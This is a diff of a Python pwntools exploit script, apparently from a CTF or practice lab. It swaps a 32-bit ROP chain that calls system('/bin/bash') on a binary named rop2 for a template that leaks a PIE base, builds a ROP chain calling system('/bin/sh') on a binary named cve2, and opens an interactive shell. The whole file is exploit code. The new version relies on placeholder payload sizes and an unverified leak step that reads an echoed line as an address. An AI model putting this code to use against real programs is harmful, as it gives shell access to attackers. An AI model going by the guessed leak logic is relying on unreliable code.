@@ -1,41 +1,45 @@
 from pwn import *
+# Set up pwntools for the correct architecture
+context.binary = './cve/cve-2/cve2'
+elf = context.binary
 
-# Path to the binary
-binary_path = './pwn/stack/rop-2/rop2'
+# Start the process
+p = process(elf.path)
 
-# Start process
-p = process(binary_path)
+# Step 1: Leak a PIE base address
+# Assuming there is a vulnerability to leak an address (e.g., format string or buffer overflow)
+# Replace this with the actual method to leak an address
+leak_payload = b'A' * 64  # Adjust the payload size as needed
+p.sendline(leak_payload)
 
-# Load the ELF binary
-elf = ELF(binary_path)
+# Receive the leaked address
+leaked_data = p.recvline()
+leaked_address = u64(leaked_data.strip().ljust(8, b'\x00'))
 
-# Find the offset to the return address
-offset = 140
+# Calculate the PIE base address
+pie_base = leaked_address - elf.symbols['main']
+log.info(f"PIE base address: {hex(pie_base)}")
 
-# Gadgets found from ROPgadget
-pop_ebx_ret = 0x08048364
-pop_ebp_ret = 0x08048473
-pop_all_ret = 0x0804859c
+# Step 2: Build the ROP chain
+rop = ROP(elf)
 
-# Address of "/bin/bash" in the data section
-bin_bash = next(elf.search(b'/bin/bash'))
+# Find the '/bin/sh' string in the binary
+bin_sh = next(elf.search(b'/bin/sh'))
 
-# Address of system() in the PLT
-system_plt = elf.plt['system']
+# Use the 'system' function to execute '/bin/sh'
+system = elf.plt['system']
 
-# Build the ROP chain
-payload = flat([
-    b'A' * offset,                    # Padding to reach return address
-    pop_all_ret,                     # Gadget to pop arguments into registers
-    bin_bash,                        # Argument for system(): pointer to "/bin/bash"
-    0xdeadbeef,                      # Pop into esi (not used)
-    0xdeadbeef,                      # Pop into edi (not used)
-    0xdeadbeef,                      # Pop into ebp (not used)
-    system_plt                       # Call system()
-])
+# Add the ROP chain
+rop.call(system, [bin_sh])
+log.info(f"ROP chain: {rop.dump()}")
+
+# Step 3: Exploit the vulnerability
+# Adjust the payload size to overwrite the return address
+payload = b'A' * 64  # Adjust the size as needed
+payload += rop.chain()
 
 # Send the payload
 p.sendline(payload)
 
-# Pass interaction back to user
+# Step 4: Interact with the shell
 p.interactive()
